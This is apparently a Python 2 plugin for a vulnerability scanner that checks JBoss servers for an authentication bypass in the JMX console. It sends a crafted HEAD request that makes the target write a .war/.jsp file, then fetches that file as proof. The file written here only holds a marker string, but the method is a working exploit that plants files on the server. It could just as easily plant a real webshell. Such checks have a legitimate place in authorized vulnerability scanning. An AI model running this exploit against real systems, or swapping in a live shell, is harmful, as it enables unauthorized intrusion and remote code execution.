# coding:utf-8
# author:wolf
import urllib2
import socket
import time
import random
from config import is_port_open, is_http


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH"))
    return str1


@is_port_open
def verify(host, port=80, name=None, timeout=15):

    if is_http(host, int(port)) is False:
        return
    info = {
        "url": "http://{}:{}".format(host, port),
        "proof": "",
        "vuln_name": "jboss auth bypass",
        "severity": "high",
        "method": "HEAD",
    }
    try:
        socket.setdefaulttimeout(timeout)
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s1.connect((host, int(port)))
        shell = "xunfengtest"
        # s1.recv(1024)
        shellcode = ""
        name = random_str(5)
        for v in shell:
            shellcode += hex(ord(v)).replace("0x", "%")
        flag = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=" + \
               "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=xunfeng&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" % (
               name) + shellcode + \
               "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
        s1.send(flag)
        data = s1.recv(512)
        s1.close()
        time.sleep(10)
        url = "http://%s:%d" % (host, int(port))
        webshell_url = "%s/%s/xunfeng.jsp" % (url, name)
        info["proof"] = webshell_url
        res = urllib2.urlopen(webshell_url, timeout=timeout)
        if 'xunfengtest' in res.read():
            return info
    except Exception, e:
        pass
